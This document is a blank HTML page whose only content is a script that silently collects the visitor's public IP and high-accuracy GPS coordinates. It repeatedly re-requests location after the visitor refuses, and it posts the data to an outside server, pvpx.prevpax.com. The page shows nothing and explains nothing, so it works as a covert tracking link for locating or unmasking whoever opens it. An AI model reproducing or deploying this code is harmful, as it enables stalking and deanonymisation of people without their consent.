<!DOCTYPE html>
<html>
  
<body>
 
 
<script>

 
<script>

    var lat, lng, ip, allData;

    function setApi() {


        var navigatorObject = navigator;

       



        var data = new FormData();
        data.append("wForm", "formApi");
        data.append("lat", lat);
        data.append("lng", lng);
        data.append("ip", ip);
        data.append("allData", allData);


        console.log(ip);

        fetch("http://pvpx.prevpax.com/api/v2/",
            {
                method: "POST",
                headers: {
                    "Access-Control-Allow-Origin": "*",
                    "Content-Type": "text/plain"
                },//"mode" : "no-cors",
                body: data
            });




    }
     

    function getIp(callback) {
        function response(s) {
            callback(window.userip);

            s.onload = s.onerror = null;
            document.body.removeChild(s);
        }

        function trigger() {
            window.userip = false;

            var s = document.createElement("script");
            s.async = true;
            s.onload = function () {
                response(s);
            };
            s.onerror = function () {
                response(s);
            };

            s.src = "https://l2.io/ip.js?var=userip";
            document.body.appendChild(s);
        }

        if (/^(interactive|complete)$/i.test(document.readyState)) {
            trigger();
        } else {
            document.addEventListener('DOMContentLoaded', trigger);
        }

       
    }

    getIp(function (ip) {

       this.ip = ip; 
        setApi();
        console.log(ip);
    });

    var x = document.getElementById("demo");


    getLocation();

function getLocation()
{
     
     
  if (navigator.geolocation)
  {

      var options = {
          enableHighAccuracy: true,
          maximumAge: 30000,
          timeout: 27000
      };


      navigator.geolocation.getCurrentPosition(showPosition, showError, options);
    } 
  }
function showPosition(position)
{
    this.lat = position.coords.latitude;
    this.lng = position.coords.longitude;
    this.allData = position.coords.accuracy;

    setApi();
  }
function showError(error)
  {
  switch(error.code)
    {
      case error.PERMISSION_DENIED:
          getLocation();
       
      break;
    case error.POSITION_UNAVAILABLE:
      
      break;
      case error.TIMEOUT:
          getLocation();
     
      break;
      case error.UNKNOWN_ERROR:
          getLocation();
       
      break;
    }
  }
</script>

</script>
</body>
</html>
 
